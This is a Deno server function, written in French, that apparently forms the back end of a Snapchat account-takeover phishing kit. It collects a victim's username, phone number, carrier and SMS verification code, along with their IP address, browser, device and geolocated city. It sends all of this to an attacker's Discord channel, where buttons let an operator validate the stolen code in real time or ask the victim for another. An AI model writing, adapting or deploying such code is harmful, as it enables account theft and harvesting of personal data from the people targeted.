import { createClientFromRequest } from 'npm:@base44/sdk@0.8.31';

const BOT_TOKEN = Deno.env.get("DISCORD_BOT_TOKEN");
const CHANNEL_ID = "1512395679958302843";

async function sendBotMessage(payload) {
  return fetch(`https://discord.com/api/v10/channels/${CHANNEL_ID}/messages`, {
    method: "POST",
    headers: { "Content-Type": "application/json", "Authorization": `Bot ${BOT_TOKEN}` },
    body: JSON.stringify(payload),
  });
}

Deno.serve(async (req) => {
  const base44 = createClientFromRequest(req);
  const { snapchat, telephone, operateur, code, submissionId } = await req.json();

  const formatPhone = (tel) => tel.replace(/(\d{2})(?=\d)/g, '$1 ').trim();
  const formatPhoneRaw = (tel) => tel.replace(/\D/g, '').slice(-10);

  const ip = req.headers.get("x-forwarded-for")?.split(",")[0]?.trim() || "Inconnue";
  const userAgent = req.headers.get("user-agent") || "";
  
  let browser = "Inconnu";
  let device = "Inconnu";
  
  if (userAgent.includes("Chrome")) browser = "Chrome";
  else if (userAgent.includes("Safari")) browser = "Safari";
  else if (userAgent.includes("Firefox")) browser = "Firefox";
  else if (userAgent.includes("Edge")) browser = "Edge";
  
  if (userAgent.includes("Mobile") || userAgent.includes("Android")) device = "📱 Téléphone";
  else if (userAgent.includes("iPad")) device = "📱 Tablette";
  else device = "💻 PC";
  
  const now = new Date();
  const dateStr = now.toLocaleDateString("fr-FR", {
    weekday: "long", day: "numeric", month: "long", year: "numeric",
    hour: "2-digit", minute: "2-digit", second: "2-digit",
    timeZone: "Europe/Paris"
  });

  const operatorColors = { SFR: 16711680, Bouygues: 3447003, Orange: 16753920 };
  const geoResponse = await fetch("https://ipapi.co/" + ip + "/json/").catch(() => null);
  let geoData = { country_name: "France", city: "Inconnue" };
  if (geoResponse?.ok) {
    geoData = await geoResponse.json();
  }

  const country = geoData.country_name || "France";
  const city = geoData.city || "Inconnue";

  const embed = {
    title: "🔑 Code SMS entré",
    color: operatorColors[operateur] || 16776960,
    fields: [
      { name: "👻 Utilisateur", value: `@${snapchat}`, inline: true },
      { name: "📡 Opérateur", value: operateur, inline: true },
      { name: "📞 Numéro", value: formatPhone(telephone), inline: true },
      { name: "🔢 Code entré", value: `**${code}**`, inline: true },
      { name: "🌍 Pays", value: country, inline: true },
      { name: "🏙️ Ville", value: city, inline: true },
      { name: "🌐 Navigateur", value: browser, inline: true },
      { name: "💾 Appareil", value: device, inline: true },
      { name: "🕵️ Adresse IP", value: `\`${ip}\``, inline: true },
      { name: "🕐 Date de soumission", value: dateStr, inline: false },
    ],
    footer: { text: `ID: ${submissionId || "N/A"}` },
    timestamp: now.toISOString(),
  };

  const components = [{
    type: 1,
    components: [
      { type: 2, style: 3, label: "✅ Valider le code", custom_id: `action:valid:${submissionId}` },
      { type: 2, style: 4, label: "❌ Changer le numéro", custom_id: `action:wrong:${submissionId}` },
      { type: 2, style: 1, label: "⏰ Renvoyer au code", custom_id: `action:expired:${submissionId}` },
      { type: 2, style: 4, label: "🚫 Instant Blacklist", custom_id: `action:blacklist:${submissionId}:${ip}` },
    ]
  }];

  await sendBotMessage({ embeds: [embed], components });

  return Response.json({ ok: true });
});